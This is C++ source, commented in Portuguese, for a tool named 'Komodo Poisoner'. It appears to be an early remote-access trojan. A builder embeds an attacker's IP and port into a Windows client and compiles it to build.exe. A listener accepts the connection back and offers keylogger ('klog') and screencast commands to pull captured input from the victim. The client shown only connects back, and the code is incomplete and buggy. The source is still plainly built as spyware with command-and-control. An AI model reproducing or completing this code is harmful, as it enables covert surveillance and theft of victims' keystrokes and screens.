#include <iostream>
#include <string>
#include <thread>

//Socket Libs:
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>

//Bilbiotecas utilizadas no builder:
#include <fstream>

//Header de configurações
#include "./config.h"

//Variaveis utilizadas para receber as informaçôes para a conexão.
const int command_size = 100;
char command[command_size];
std::string ip = "";
std::string _port = "";
int port = 0;
int i = 0;
bool parameters_found = false;
bool hifen_encontrado = false;
bool estado_de_conexao = false;

//Variaveis utilizadas no modulo de conexão:
int server_fd, new_socket, valread;
struct sockaddr_in address;
int opt = 1;
int addrlen = sizeof(address);
char buffer[1024] = {0};
const char* hello = "Hello from server";

//Variaveis utilizadas no builder:
std::string build_content_1 = "#include <winsock2.h>\n#include <windows.h>\n#include <iostream>\n#include <ws2tcpip.h>\n#include <cstring>\nint main() {\nWSADATA wsaData;\nSOCKET clientSocket = INVALID_SOCKET;\nstruct sockaddr_in serverAddress;\nconst char* hello = \"Hello from client\";\nchar buffer[1024] = {0};\nif (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\nstd::cerr << \"Falha na inicialização do Winsock\" << std::endl;\nreturn -1;\n}\n/* Criando o socket*/\nif ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {\nstd::cerr << \"Falha na criação do socket\" << std::endl;\nWSACleanup();\nreturn -1;\n}\nserverAddress.sin_family = AF_INET;\nserverAddress.sin_port = htons(";
std::string build_content_2 = ");\nserverAddress.sin_addr.s_addr = inet_addr(\"";
std::string build_content_3 = "\");\nif (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {\nstd::cerr << \"Erro na conexão com o servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nif (send(clientSocket, hello, strlen(hello), 0) < 0) {\nstd::cerr << \"Erro no envio de dados ao servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nif (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {\nstd::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nstd::cout << \"Resposta do servidor: \" << buffer << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn 0;\n}";

//Declaração das funçôes
int port_extractor();
int ip_extractor();
int function_loader();
int open_listener();
int builder();

int main(){
        system("clear");
        std::cout << "Komodo Poisoner\n";
        std::cout << "\nComandos:\n";
        std::cout << "-h: indica o host (IP ou DDNS) do servidor\n" ;
        std::cout << "-p: indica a porta a ser utilizada oela conexão\n";
        std::cout << "\nUtilize:\n";
        std::cout << "listener -p <PORT>\nbuilder -h <IP> -p <PORT>\n";
	std::cout << "Para obter ajuda\n";

        std::cout << "\n$: ";
        std::cin.getline(command, command_size);

        if(function_loader() != 0){
                std::cout << "Erro ao extrair os parâmetros\n";
        }
        std::cout << "A porta é: " << port << '\n';
        std::cout << "O IP é: " << ip << '\n';

        return 0;
}//Fim do main

int port_extractor(){

        hifen_encontrado = false;

        do{
                if(command[i] == '-'){
                        hifen_encontrado = true;
                }else{
                        ++i;
                }

                if(i >= 100){
                        std::cout << "Sintaxe incorreta\n";
                        break;
                }
        }while(hifen_encontrado != true);

        i += 3;

        for(int j = 0; j < 4; j++){
                if(command[i] != ' '){
                        _port += command[i];
                }
        ++i;

        }
        port = std::stoi(_port);
        return 0;
}

int ip_extractor(){

        hifen_encontrado = false;

        do{
                if(command[i] == '-'){
                        hifen_encontrado = true;
                }else{
                        ++i;
                }

                if(i >= 100){
                        std::cout << "Sintaxe incorreta\n";
                        break;
                }
        }while(hifen_encontrado != true);

        i += 3;


        for(int j = 0; j < 15; j++){
                if(command[i] == '-'){
                        break;
                }

                if(command[i] != ' '){
                        ip += command[i];
                }
                ++i;
        }
return 0;
}

int function_loader(){

        if(parameters_found == false){

        	if(command[0] == 'l'){
        		if(port_extractor() == 0){
        			std::cout << "Porta extraida com sucesso\n";
        		}else{
        			std::cout << "Erro ao extrair a porta\n";
        		}

        		std::cout << "Iniciando Listener\n";
        		std::thread listener(open_listener);
			listener.join();

        	}else if(command[0] == 'b'){
        		if(ip_extractor() == 0){
        			std::cout << "IP extraido com sucesso";
        		}else{
        			std::cout << "Erro ao extrair o IP\n";
        		}

        	if(port_extractor() == 0){
        		std::cout << "Porta extraida com sucesso\n";
        	}else{
        		std::cout << "Erro ao extrair a porta\n";
        	}
        	std::cout << "Chamando Builder\n";
        	builder();

		std::cout << "\nDeseja iniciar o Listener? (s/n)\n";
		std::cout << "$Builder$: ";
		memset(command, 0, command_size);
		std::cin.getline(command, command_size);
		if(command[0] == 's' || command[0] == 'S'){
			std::thread listener(open_listener);
			listener.join();
		}else{
			exit(1);
		}

        	parameters_found = true;

        	}else{
        		std::cout << "Sintaxe Incorreta\n";
        	}
        }

return 0;

}

int open_listener()
{

    // Criando o socket
        std::cout << "Criando socket\n";
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        std::cerr << "Falha na criação do socket" << std::endl;
        return -1;
    }

        std::cout << "Configurando Socket\n";
    // Configurando opções do socket
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        std::cerr << "Erro na configuração das opções do socket" << std::endl;
        return -1;
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);

    // Vinculando o socket a um endereço
        std::cout << "Vinculando (binding) o socket\n";
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        std::cerr << "Erro na vinculação do socket a um endereço" << std::endl;
        return -1;
    }

    // Aguardando conexões
        std::cout << "Aguardando pelo client\n";
    if (listen(server_fd, 3) < 0) {
        std::cerr << "Erro na espera por conexões" << std::endl;
        return -1;
    }

    // Aceitando a conexão de um cliente
    if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
        std::cerr << "Erro na aceitação da conexão" << std::endl;
        return -1;
    }

        std::cout << "Cliente conectado com sucesso\n";
	estado_de_conexao = true;

	//Caso o listener seja iniciado, o programa não fecha e segue:
	std::cout << "Listener\n";
	std::cout << "Instruções:\nklog -h\nscreencast -h\nexit a qualquer momento para sair.\n";

	while(estado_de_conexao == true){
		memset(command, 0, command_size);
		std::cout << "\n$listener$: ";
		std::cin.getline(command, command_size);

		if(command[0] == 'k'){
			//Key logger
			hifen_encontrado = false;
			i = 0;
			do{
                		if(command[i] == '-'){
				hifen_encontrado = true;
                		}else{
                        		++i;
                		}

                		if(i >= 100){
                        		std::cout << "Sintaxe incorreta\n";
        				break;
        			}

        		}while(hifen_encontrado != true);

			++i;

			if(command[i] == 'h'){
				std::cout << "\nklog <start/stop> <Parâmetros do start>\n";
				std::cout << "--begin        Inicia o Keylogger\n";
				std::cout << "--end 	      Para o Keylogger\n";
				std::cout << "-t            Mostra a input do usuário diretamente na tela do terminal\n";
				std::cout << "-o \"nome.txt\" Grava a input capturada em um arquivo\n\n";
			}

			++i;
			if(command[i] = 'b')
			{
				std::cout << "Usuário escolheu a opção begin\n";

				hifen_encontrado = false;
                        	do{
                                	if(command[i] == '-')
					{
                                		hifen_encontrado = true;
                                	}else
					{
                                        	++i;
                                	}

                                	if(i >= 100)
					{
                                        	std::cout << "Sintaxe incorreta\n";
                                        	break;
                                	}

                        	}while(hifen_encontrado != true);

				++i;
				if(command[i] == 't')
				{
					while(estado_de_conexao == true)
					{
						std::cout << "Imprimir no terminal\n";
						// Enviando request de dados ao client:
						send(new_socket, "REQUEST_FLAG", 12, 0 );
    						valread = read(new_socket, buffer, 1024);
    						std::cout << buffer;

    						// Esperando antes de requisitar o próximo buffer
						sleep(klog_update_time);
					}

				}else if(command[i] == 'o')
				{
					std::cout << "Gravar em arquyivo\n";
					// Recebendo dados do cliente
    					valread = read(new_socket, buffer, 1024);
    					std::cout << buffer << std::endl;

    					// Enviando resposta ao cliente
    					send(new_socket, hello, strlen(hello), 0);
    					std::cout << "Resposta enviada ao cliente" << std::endl;

				}else
				{
					std::cout << "Sintaxe incorreta\n";
				}
			}

		}else if(command[0] == 's'){
			//ScreenCast

		}else if(command[0] == 'e'){
			exit(1);
		}else{
			std::cout << "Sintaxe incorreta: " << command[i];
		}
	}
	//FIm do while

	// Fechando o socket
	close(new_socket);
	close(server_fd);
        return 0;
}


int builder()
{
        std::ofstream arquivocpp("build.cpp");

        arquivocpp << build_content_1;
        arquivocpp << port;
        arquivocpp << build_content_2;
        arquivocpp << ip;
        arquivocpp << build_content_3;

        arquivocpp.close();

        std::ofstream call_compiler("call_compiller.sh");
        call_compiler << "i686-w64-mingw32-g++ build.cpp -o build.exe -lws2_32 -static-libgcc -static-libstdc++";
        call_compiler.close();
        system("chmod +x ./call_compiller.sh && ./call_compiller.sh");

        std::cout << ".exe gerado com sucesso\n";
return 0;
}
